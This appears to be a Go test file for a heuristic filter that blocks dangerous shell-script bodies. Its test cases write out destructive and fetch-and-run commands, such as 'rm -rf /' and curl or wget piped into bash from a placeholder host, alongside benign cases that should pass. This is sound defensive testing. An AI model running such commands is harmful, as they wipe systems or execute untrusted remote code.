package main

import (
	"strings"
	"testing"
)

func TestHeuristicSieve_FlagsDangerousPatterns(t *testing.T) {
	cases := []struct {
		name string
		body string
		hit  string
	}{
		{"rm -rf /", "rm -rf /\n", "rm-rf-root"},
		{"rm -rf / with star", "rm -rf /*\n", "rm-rf-root"},
		{"rm -fr / (flag order)", "rm -fr /\n", "rm-rf-root"},
		{"rm -Rf /", "rm -Rf /\n", "rm-rf-root"},
		{"curl | bash", "curl https://x.example/s.sh | bash\n", "fetch-pipe-shell"},
		{"curl | sudo bash", "curl https://x.example/s.sh | sudo bash\n", "fetch-pipe-shell"},
		{"wget -O - | sh", "wget -O - https://x.example/s.sh | sh\n", "fetch-pipe-shell"},
		{"curl pipeline ending in bash", "curl https://x.example/s.sh | sed s/foo/bar/ | bash\n", "fetch-pipe-shell"},
		{"base64 -d | sh", "echo aGkK | base64 -d | sh\n", "base64-pipe-shell"},
		{"base64 --decode | bash", "base64 --decode <<<aGkK | bash\n", "base64-pipe-shell"},
		{"sudo bash -c", "sudo bash -c 'whoami'\n", "sudo-shell"},
		{"sudo sh -c", "sudo sh -c \"id\"\n", "sudo-shell"},
	}
	for _, c := range cases {
		v := heuristicSieve{}.Evaluate([]byte(c.body), SieveMeta{})
		if !v.Block {
			t.Errorf("%s: expected block, got pass", c.name)
			continue
		}
		if !strings.Contains(v.Reason, c.hit) {
			t.Errorf("%s: reason %q did not include %q", c.name, v.Reason, c.hit)
		}
		if !strings.Contains(v.Reason, "heuristic") || !strings.Contains(v.Reason, "not a guarantee") {
			t.Errorf("%s: reason %q missing honest-framing language", c.name, v.Reason)
		}
	}
}

func TestHeuristicSieve_PassesBenignBodies(t *testing.T) {
	bodies := []string{
		"echo hello\n",
		"#!/usr/bin/env bash\nset -euo pipefail\necho install complete\n",
		"rm -rf /tmp/build\n",          // root prefix, not root itself
		"rm -rf /home/user/cache\n",    // safe deletion
		"sudo apt-get install -y foo\n", // sudo for a package manager, no shell
		"sudo systemctl restart sshd\n", // sudo for systemctl
		"curl -fsSL https://x.example/file > out.txt\n", // download, not piped
		"echo SGVsbG8K | base64 -d > greeting.txt\n",    // base64 decode to file
	}
	for _, b := range bodies {
		v := heuristicSieve{}.Evaluate([]byte(b), SieveMeta{})
		if v.Block {
			t.Errorf("benign body unexpectedly blocked (%s): %q", v.Reason, b)
		}
	}
}

func TestHeuristicSieve_ReportsMultipleHits(t *testing.T) {
	body := "rm -rf /\ncurl https://x.example/s.sh | bash\n"
	v := heuristicSieve{}.Evaluate([]byte(body), SieveMeta{})
	if !v.Block {
		t.Fatal("expected block")
	}
	for _, want := range []string{"rm-rf-root", "fetch-pipe-shell"} {
		if !strings.Contains(v.Reason, want) {
			t.Errorf("reason %q missing %q", v.Reason, want)
		}
	}
}

func TestHeuristicSieve_EmptyBodyPasses(t *testing.T) {
	v := heuristicSieve{}.Evaluate(nil, SieveMeta{})
	if v.Block {
		t.Errorf("empty body should pass heuristic, got: %s", v.Reason)
	}
}
